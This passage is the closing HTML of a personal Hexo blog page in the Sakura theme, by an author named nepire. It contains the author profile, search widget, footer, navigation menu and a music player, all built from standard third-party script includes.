        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>

      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <a href="https://nepire.github.io/" class="profile gravatar"><img src="/images/title.ico" itemprop="image" alt="nepire" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="https://nepire.github.io/" itemprop="url" rel="author">nepire</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i>逐梦者</p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            // PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 nepire<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2018</p>
    </div>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>
<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>

    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="/images/title.ico">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">艦隊nepire</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="https://github.com/Nepire" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="https://github.com/Nepire" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
      
        <a href="https://github.com/Nepire" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/技术/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
              <li>
                <a href="/categories/生活/">
                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
                  生活
                </a>
              </li>
            
              <li>
                <a href="/categories/资源/">
                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
                  资源
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="javascript:;">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
            清单
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/tags/悦读/">
                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                  书单
                </a>
              </li>
            
              <li>
                <a href="/bangumi/">
                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                  番组
                </a>
              </li>
            
              <li>
                <a href="/music/">
                  <i class="fa fa-headphones" aria-hidden="true"></i>
                  歌单
                </a>
              </li>
            
              <li>
                <a href="/tags/图集/">
                  <i class="fa fa-photo" aria-hidden="true"></i>
                  图集
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            留言板
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/links/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
            友人帐
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/donate/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
            赞赏
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
            关于
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/about/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  我？
                </a>
              </li>
            
              <li>
                <a href="/theme-sakura/">
                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
                  主题
                </a>
              </li>
            
              <li>
                <a href="/lab/">
                  <i class="fa fa-cogs" aria-hidden="true"></i>
                  Lab
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/client/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
            客户端
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/atom.xml">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
            RSS
          </span>
        </a>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="2660651585"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
</body>
</html>